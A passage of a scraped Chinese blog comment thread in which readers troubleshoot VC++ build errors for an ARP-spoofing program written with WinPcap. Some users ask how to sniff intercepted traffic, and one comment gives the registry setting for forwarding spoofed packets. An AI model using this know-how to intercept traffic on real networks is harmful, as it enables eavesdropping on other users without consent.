+<br>我是想运行程序后能够有两个选择，一个是一边嗅探一边转发；另一个选择是只嗅探不转发。希望能帮我实现一下
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl45_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl45$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl45_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25070">#</a>&nbsp;<a name="25070"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-29 15:17
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl46_NameLink" target="_blank">雪狐</a>
+					</div>
+					<div class="postText">
+						雪狼兄
+<br>link1104:cannot open files pcap.lib 大家看出现这个问题怎么回事啊?
+<br>pacp_next_ex:undeclared identifier 大家看出现这个问题怎么回事啊?
+<br>
+<br>这两个问题你是怎么解决的？&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狐")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%90" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl46_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl46$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl46_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25074">#</a>&nbsp;<a name="25074"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-29 15:33
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl47_NameLink" target="_blank">雪狐</a>
+					</div>
+					<div class="postText">
+						出现错误error C2371: 'IN6_ADDR' : redefinition; different basic types此时，你只需要将该workspace选中，然后clean，再将INCLUDE中PSDK放到最前面即可
+<br>@guava&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狐")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%90" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl47_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl47$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl47_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25128">#</a>&nbsp;<a name="25128"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-30 15:41
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl48_NameLink" target="_blank">雪狐</a>
+					</div>
+					<div class="postText">
+						link1104:cannot open files pcap.lib 大家看出现这个问题怎么回事啊? 
+<br>
+<br>忍不住要自问自答，是不是把
+<br>#pragma comment(lib,"pcap")
+<br>改成
+<br>#pragma comment(lib,"wpcap")
+<br>
+<br>至少我改过之后连接就通过了，不报错了。
+<br>不知道这样改会不会产生什么副作用，请雪狼或者楼主出来个解释，谢谢:)&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狐")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%90" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl48_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl48$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl48_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25134">#</a>&nbsp;<a name="25134"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-05-30 17:08
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl49_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						那个好像是这样改改就行，我也知道这个问题，我不知道当时我是这么搞成pcap的了，改成wpcap可以应该是没有问题的。@雪狐
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl49_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl49$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl49_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25312">#</a>&nbsp;<a name="25312"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-02 11:24
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl50_NameLink" target="_blank">雨辰</a>
+					</div>
+					<div class="postText">
+						我现在出现的错误是，Cannot open include file: 'pcap.h': No such file or directory
+<br>怎么修改呢？&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雨辰")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%a8%e8%be%b0" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl50_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl50$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl50_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25572">#</a>&nbsp;<a name="25572"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-05 15:19
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl51_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						需要如何把debug里的exe转换成可单独运行的程序&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl51_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl51$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl51_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25963">#</a>&nbsp;<a name="25963"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-10 15:17
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl52_NameLink" target="_blank">calen3</a>
+					</div>
+					<div class="postText">
+						我遇到的问题比较奇怪,已经设置了多线程,装了winpcap和SDK,
+<br>cannot convert parameter 3 from 'const unsigned char ** ' to 'unsigned char ** '
+<br> unable to recover from previous error(s); stopping compilation
+<br>
+<br>目标指向了	
+<br>while((k=pcap_next_ex(slecadopt,&amp;pkt_header,(const u_char**)&amp;pkt_data))&gt;=0)
+<br>不知道怎么回事?&nbsp;&nbsp;<a onclick='return SetReplyAuhor("calen3")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=calen3" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl52_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl52$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl52_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#25970">#</a>&nbsp;<a name="25970"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-10 16:25
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl53_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						如果改了代码 就检查下改过的地方
+<br>应该是语法错误
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl53_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl53$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl53_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#26019">#</a>&nbsp;<a name="26019"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-11 09:52
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl54_NameLink" target="_blank">雪狐</a>
+					</div>
+					<div class="postText">
+						我也遇到过这个问题,把强制类型转换中的const去掉,可以编译通过.&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狐")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%90" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl54_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl54$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl54_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#26189">#</a>&nbsp;<a name="26189"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-12 17:34
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl55_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						想请你看一下<a target="_new" href="http://space.codepub.com/28058/viewspace-4990.html">http://space.codepub.com/28058/viewspace-4990.html</a>
+<br>里的<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>_cheat_sniff_v2.1源文件要怎样配置啊?我怎么打不开<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.dsw文件呢?我不知道怎样上传给你,麻烦你了.谢谢!
+<br>&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl55_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl55$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl55_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#26252">#</a>&nbsp;<a name="26252"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-13 14:59
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl56_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						怎样修改以前那个程序能把程序中所要转发的数据显示到屏幕上或保存下来?&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl56_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl56$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl56_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#26333">#</a>&nbsp;<a name="26333"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-14 19:29
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl57_NameLink" href="http://www.cppblog.com/erlang-me/" target="_top"><b style="color: black; background-color: rgb(255, 255, 102);">arp</b>.spoofer</a>
+					</div>
+					<div class="postText">
+						不用程序中的转发函数也能实现路由转发。只要打开注册表中的路由转发项就可以了HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter == 0x1
+<br>
+<br>如果要看转发的IP包，直接调用Pcap_next_ex()或者Pcap_loop()函数，然后把内容或包长度等信息显示在屏幕上就行了。
+<br>winpcap的帮助文档里第3第4个例程对你有帮助。
+<br>@雪狼&nbsp;&nbsp;<a onclick='return SetReplyAuhor("arp.spoofer")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=arp.spoofer" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl57_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl57$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl57_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#26565">#</a>&nbsp;<a name="26565"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-18 15:53
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl58_NameLink" target="_blank">雪狼</a>
+					</div>
+					<div class="postText">
+						
+<br>好,谢了!&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狼")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%bc" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl58_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl58$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl58_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#27089">#</a>&nbsp;<a name="27089"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-27 18:38
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl59_NameLink" target="_blank">学狐</a>
+					</div>
+					<div class="postText">
+						我遇到一个奇怪的问题。在<b style="color: black; background-color: rgb(160, 255, 255);">扫描</b>的时候只显示出我的mac地址然后程序就不继续下去了，scanning没有出现在屏幕上，当然也没打印出网络中的主机。Debug时，程序到WaitForSingleObject()这个函数就停住，F10也不往下跳了。这是为什么？有没有可能和网络结构有关。我所在的网络是固定IP，我自己设置IP：10.10.143.69掩码：255.255.255.0网关：10.10.143.20DNS服务器：202.119.230.8。急盼指教，谢谢！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("学狐")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%ad%a6%e7%8b%90" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl59_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl59$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl59_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#27095">#</a>&nbsp;<a name="27095"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-27 20:39
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl60_NameLink" target="_blank">雪狐</a>
+					</div>
+					<div class="postText">
+						知道是什么问题了，不过仍然很奇怪！
+<br>/*找到我的ip*/ 
+<br>myip-&gt;ip=((struct sockaddr_in *)d-&gt;addresses-&gt;next-&gt;addr)-&gt;sin_addr.s_addr; 
+<br>
+<br>在主程序中的这行，被添加了-&gt;next。单步调的时候发现这样添加就通了。但是在其他机器上不添加可以通过，我觉得可能是机器的原因了。 Anyway！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狐")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%90" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl60_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl60$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl60_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#27162">#</a>&nbsp;<a name="27162"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-06-28 17:15
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl61_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						雪狐你专研的很多啊   加油  嘿咻&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl61_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl61$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl61_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]关于装好VC++ 6.0后遇到的问题" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#28533">#</a>&nbsp;<a name="28533"></a>re: [原创]关于装好VC++ 6.0后遇到的问题
+						<span>
+								2007-07-21 23:20
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl62_NameLink" target="_blank">羊</a>
+					</div>
+					<div class="postText">
+						我的系统是VISTA.刚装的VC++ 6.0(企业版),提示成功安装了.但是打开编了个最简单的"hello world",调试成功了
+<br>但是连接时出现下面的代码,请大虾们帮忙看下:
+<br>--------------------Configuration: helloWorld - Win32 Debug--------------------
+<br>Linking...
+<br>LINK : fatal error LNK1104: cannot open file "Debug/helloWorld.exe"
+<br>执行 link.exe 时出错.
+<br>
+<br>helloWorld.exe - 1 error(s), 0 warning(s)
+<br>
+<br>这是为啥呢?
+<br>而且我发现文件夹里没有出现Dubeg文件&nbsp;&nbsp;<a onclick='return SetReplyAuhor("羊")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e7%be%8a" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl62_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl62$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl62_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码[未登录]" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#28737">#</a>&nbsp;<a name="28737"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码[未登录]
+						<span>
+								2007-07-25 08:47
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl63_NameLink" target="_blank">初学者</a>
+					</div>
+					<div class="postText">
+						我下载了此程序后，用VC++6编译出现：
+<br>C:\arpsproof.cpp(132) : error C2065: '_beginthreadex' : undeclared identifier
+<br>错误，请指点&nbsp;&nbsp;<a onclick='return SetReplyAuhor("初学者")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e5%88%9d%e5%ad%a6%e8%80%85" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl63_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl63$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl63_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#28741">#</a>&nbsp;<a name="28741"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-07-25 09:39
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl64_NameLink" target="_blank">雪狐</a>
+					</div>
+					<div class="postText">
+						building-setting-c/c++-category-code generation 
+<br> 下面的use runtime library改为debug multithreaded 
+<br> 下面的struct member aligment 改为2 bytes 
+<br> 在link里面加上wpcap.lib IPHlpApi.lib ws2_32.lib三个文件
+<br>
+<br>这个在上面的帖子里有给出过，可能是这样吧？！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("雪狐")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=%e9%9b%aa%e7%8b%90" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl64_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl64$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl64_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#28808">#</a>&nbsp;<a name="28808"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-07-26 11:01
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl65_NameLink" target="_blank">saga</a>
+					</div>
+					<div class="postText">
+						@初学者
+<br>雪狐说的是可对的！&nbsp;&nbsp;<a onclick='return SetReplyAuhor("saga")' href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#post">回复</a>&nbsp;&nbsp;<a title="查看该作者发表过的评论" href="http://www.cppblog.com/comment?author=saga" target="_top">更多评论</a>
+						<br>
+						<a id="AjaxHolder_Comments_CommentList_ctl65_DeleteLink" href="javascript:__doPostBack('AjaxHolder$Comments$CommentList$ctl65$DeleteLink','')"></a>&nbsp;&nbsp;<a id="AjaxHolder_Comments_CommentList_ctl65_EditLink"></a>
+					</div>
+				</div>
+				<br>
+			
+				<div class="post">			
+					<div class="postTitle">
+						<a title="permalink: re: [原创]用Winpcap编写的一个在交换环境实现arp欺骗的代码" href="http://www.cppblog.com/saga/archive/2006/07/13/6169.html#32121">#</a>&nbsp;<a name="32121"></a>re: [原创]用Winpcap编写的一个在交换环境实现<b style="color: black; background-color: rgb(255, 255, 102);">arp</b>欺骗的代码
+						<span>
+								2007-09-13 13:19
+						</span>
+						<a id="AjaxHolder_Comments_CommentList_ctl66_NameLink" target="_blank">abc</a>
+					</div>
+					<div class="postText">
+						我是直接用VC6打开这个文件，然后编辑，系统提示需要自动生成工程文件，我就按照系统提示自动生成了，然后在工程里面添加了两个路径
+<br>如果我在工程里面添加了
+<br>C:\wdq\WpdPack\Include,c:/Program Files/Microsoft Platform SDK/include
+<br>编译，出现错误：
+<br>c:\program files\microsoft platform sdk\include\wspiapi.h(45) : error C2265: '&lt;Unknown&gt;' : reference to a zero-sized array is illegal
+<br>c:\program files\microsoft platform sdk\include\wspiapi.h(45) : error C2265: '&lt;Unknown&gt;' : reference to a zero-sized array is illegal
+<br>去掉c:/Program Files/Microsoft Platform SDK/include，将他放在全局目录里面，会出现错误：
+<br>c:\program files\microsoft platform sdk\include\ipexport.h(39) : error C2371: 'IN6_ADDR' : redefinition; different basic types
+<br>        c:\program files\microsoft visual studio\vc98\include\ws2tcpip.h(68) : see declaration of 'IN6_ADDR'
+<br>c:\program files\microsoft platform sdk\include\iphlpapi.h(183) : error C2065: 'PMIB_ICMP_EX' : undeclared identifier
+<br>c:\program files\microsoft platform sdk\include\iphlpapi.h(183) : error C2146: syntax error : missing ')' before identifier 'pStats'
+<br>c:\program files\microsoft platform sdk\include\iphlpapi.h(183) : warning C4229: anachronism used : modifiers on data are ignored
+<br>c:\program files\microsoft platform sdk\include\iphlpapi.h(185) : error C2059: syntax error : ')'
